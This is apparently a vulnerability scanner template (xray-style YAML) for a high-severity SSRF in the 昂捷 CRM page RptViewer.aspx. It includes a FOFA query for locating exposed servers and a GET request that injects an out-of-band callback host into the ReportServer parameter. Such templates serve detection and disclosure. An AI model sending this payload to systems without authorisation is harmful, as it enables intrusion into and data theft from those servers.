id: angjie-crm-rptviewer-ssrf

info:
  name: 昂捷CRM-RptViewer.aspx存在SSRF漏洞
  author: AVIC123
  severity: high
  verified: true
  description: |-
    昂捷CRM RptViewer.aspx存在SSRF漏洞，攻击者可以利用该漏洞获取服务器敏感信息。
    fofa: (body="CheckSilverlightInstalled()" && body="AllowHtmlPopupwindow") || body="/ClientBin/slEnjoy.App.xap"
  reference:
    - https://vip.bdziyi.com/58463/
  tags: angjie,SSRF
  created: 2025/09/05

set:
  oob: oob()
  oobHTTP: oob.HTTP
rules:
  r0:
    request:
      method: GET
      path: /WebForms/RptViewer.aspx?ReportServer={{oobHTTP}}
    expression: response.status == 200 && oobCheck(oob, oob.ProtocolHTTP, 3)
expression: r0()
